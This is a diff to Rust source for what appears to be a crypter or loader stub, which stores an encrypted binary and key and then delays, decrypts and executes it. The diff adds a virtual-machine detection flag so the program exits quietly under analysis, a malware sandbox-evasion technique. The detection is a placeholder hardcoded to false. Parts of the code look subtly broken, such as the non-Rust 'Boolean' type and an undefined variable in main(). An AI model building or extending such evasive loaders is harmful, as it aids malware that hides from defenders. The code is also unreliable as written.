@@ -5,17 +5,38 @@ pub struct Stub  {
     padding: u32,
     key : String,
     verbose : Boolean,
+    vm_detection : Boolean
 }
 
 impl Stub {
-    pub fn new(encrypted_bin : String , output : String, delay : u64 ,padding : u32 , key: String, verbose: Boolean) -> Stub {
+    pub fn new(
+        encrypted_bin : String,
+        output : String,
+        delay : u64,
+        padding : u32,
+        key: String,
+        verbose: Boolean,
+        vm_detection: Boolean
+    ) -> Stub {
         Stub {
             encrypted_bin,
             output,
             delay,
             padding,
             key,
-            verbose
+            verbose,
+            vm_detection
+        }
+    }
+
+    pub fn vm_detection(stub: &Stub) {
+        let is_vm = false;
+
+        if is_vm {
+            if stub.verbose {
+                println!("[INFO] VM detected. Exiting...");
+            }
+            std::process::exit(0);
         }
     }
 
@@ -42,7 +63,9 @@ impl Stub {
 }
 
 fn main() {
-
+    if vm_detection {
+        Stub::vm_detection(&stub);
+    }
     Stub::delay_execution(&stub);
     Stub::decrypt(&stub);
     Stub::execute(&stub);
